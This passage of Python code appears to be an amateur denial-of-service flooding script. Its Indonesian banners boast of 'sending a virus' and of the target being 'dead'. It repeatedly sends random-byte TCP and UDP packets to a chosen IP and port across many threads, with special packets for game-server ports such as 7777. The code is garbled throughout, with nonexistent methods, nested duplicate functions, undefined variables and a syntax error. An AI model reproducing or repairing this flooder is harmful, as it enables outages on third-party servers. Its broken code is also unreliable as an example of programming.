  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  def Lbytes():
  bytes = bytes._urandom(10022)
  bytes = bytes._range(10022)
  bytes = bytes._radint(10022)
  Kbytes = Kbytes._urandom(10022)
  Kbytes = Kbytes._Krange(10022)
  Kbytes = Kbytes._radint(10022)
  Lbytes = Lbytes._urandom(10022)
  Lbytes = Lbytes._Lrange(10022)
  Lbytes = Lbytes._Lradint(10022)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_DGRAM if udp and tcp else socket.SOCK_STREAM)
      Lbytes = (str(ip),int(port))
      for x in range(times):
        s.sendto(bytes,Lbytes,Kbytes,Lbytes)
      print(i +" | [ ======= MENGIR VIRUS DARI MARLbytes ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARLbytes ======= ] |")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes)
        s.send(K_bytes)
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

def Lbytes():
  bytes = bytes._urandom(991)
  bytes = bytes._range(10027)
  bytes = bytes._radint(777)
  Kbytes = Kbytes._urandom(677)
  Kbytes = Kbytes._Krange(1030)
  Kbytes = Kbytes._Kradint(1021)
  Lbytes = bytes._Lurandom(1555)
  Lbytes = bytes._Lrange(1223)
  Lbytes = bytes._Lradint(1002)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      Lbytes = Lbytes.socket(socket.AF_INET, socket.SOCK_STREAM if udp and tcp else socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(bytes)
      for x in range(times):
        s.send(bytes,Kbytes,Lbytes)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRULbytes =======] ")

class MyThread(threading.Thread):
     def Lbytes(self):
         while True:
                sock = Lbytes.socket(
                    socket.AF_INET, socket.SOCK_DGRAM if tcp and udp else socket.SOCK_STREAM) # Internet and UDP
                
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                msg = Pacotes[random.randrange(0,3)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(100):                                    
            mythread = MyThread()  
            mythread.start()                             
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')

for Lbytes in range(threads):
	if choice == 'KILLER-POWERUVO'
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
    th = threading.Threads(target = Lbytes)
    th.start()
 
 
 
 
 
 